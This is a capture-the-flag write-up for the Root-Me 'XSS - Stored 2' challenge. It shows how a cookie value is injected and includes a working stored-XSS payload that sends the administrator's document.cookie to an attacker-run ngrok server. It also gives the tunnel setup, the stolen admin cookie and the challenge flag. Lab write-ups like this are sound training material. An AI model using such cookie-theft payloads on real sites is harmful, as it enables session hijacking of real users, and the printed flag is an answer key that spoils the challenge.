# XSS - Stored 2

**Point**: 50 Points 

**Description**: Steal the administrator session’s cookie and go in the admin section.

## Solution:

There's a form for submitting "title" and "message" like the previous "XSS Stored".

<p align="center"><img width="450px" height="300px" src="https://user-images.githubusercontent.com/48288606/159105615-02b0859d-a253-4581-a1f0-308f5b7fce31.png"/></p>

 The point in this chall is how to find out the XSS injection point. I try many kind of payload and put in **title** and **message** box but no payload was worked. This also happen when we get into admin page. 
 
 There is nothing different between **admin** page and **"normal"** page. The **status** always be the same fixed value: `status: invite`. We also realizea parameter name "section" in URL, but with the same result, it doesn't work for injecting. 
 
<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159106283-2b92843e-3029-49c7-976a-57b353b5e449.png" /></p>

 Let's try to figure out how server knows our status. Open "Developer Tools" -> Network -> `?section=admin` -> Request Headers. Notice the cookie value:
 
<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159106471-08150bf5-b6b5-48e3-80d4-1ddd9a13a3b1.png" /></p>

The cookie `status` is set to **invite** in both '?section=admin' and without it. So maybe it the reason why the displaying **status** is always "invite". Try to change this cookie value

In "Developer Tools", move to "Application" -> Storage -> Cookie -> `http://challenge01.root-me.org/` (Our challeng cookie, there's is another cookie is default from "root-me.org"). Change **status** into some string like **khangtictoc** and reload the page:

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159106680-633a3528-07a6-4244-b64a-5bcf3c631210.png" /></p>

So we can inject string into this location. Now try to escape and use a little DOM-based XSS to bypass it , payload: `"><script>alert(1)</script>`

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159106743-5170454c-cd7f-4d88-a4d2-9b70a7945a44.png" /></p>

Yeah!! And that's is where the XSS vulnerability appears. 
 
**NOTE: Be aware of interval message display by the server. The message is triggered and that is when the back-end robot read our message and load our script and respond the admin cookie to us**
 
<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159106356-2bba56d0-a5be-4bc1-bdfe-c54af020f1fd.png" /></p>

Now this proves XSS can be in action. Now we have to get the **cookie** from the victim, we ought to delivery all collected cookie from victim (administrator) to a specific server that we take control. Payload will look like this:

```javascript
"><script>document.location="{your_server_link_site}?cookie=" + document.cookie</script>
```

Let's take action step-by-step:

1. Run PHP server with **localhost** and optional **port** without any content: `php -S localhost:4444 `

2. Public our server by tunneling. I use **ngrok** to serve this purpose:
   - Connect to ngrok with your account token: `ngrok authtoken {your_account_token}`
   - Tunneling our local site to public network with port specified above: `ngrok http 4444`
   - Get the public link we get from ngrok and create with payload above.
   ![image](https://user-images.githubusercontent.com/48288606/159106994-21909020-ea71-4a22-a956-ff6d56cda713.png)

3. Send our payload to cookie **status** and reload page:
```javascript
"><script>document.location="http://7a5d-113-161-77-200.ngrok.io?cookie=" + document.cookie</script>
``` 
<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159107059-9e3803b5-18e0-4925-89e3-5583879714f8.png" /> </p>

This show us successfully in directing to our server.

After a not-short time, the bot from server that i take note above will respond and its cookie from admin will show up in log server. 

**NOTE: While there's no admin cookie respond from server, we get in page, the page always loads our message including malicious cookie and directs to our page. Until that, just wait.**

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159107210-4fe8fa6e-8c0f-4e6f-964e-a0ed2cfc2406.png" /> </p>

The cookie is : **SY2USDIH78TF3DFU78546TE7F**. When the bot got the message, which is loaded with our malicious code from cookie; the bot would automatically clear all sent message and start a new session a new page Now with the description "Steal the administrator session’s cookie and go in the admin section." , we just have to get in page with given **ADMIN_COOKIE** 

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159107511-526b091f-bc20-4223-9206-bc118f007afd.png" /> </p>

Reload the page:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159107453-84a773ff-8aed-4a2d-ad03-8085a55dee08.png" /> </p>

FLag: **E5HKEGyCXQVsYaehaqeJs0AfV**

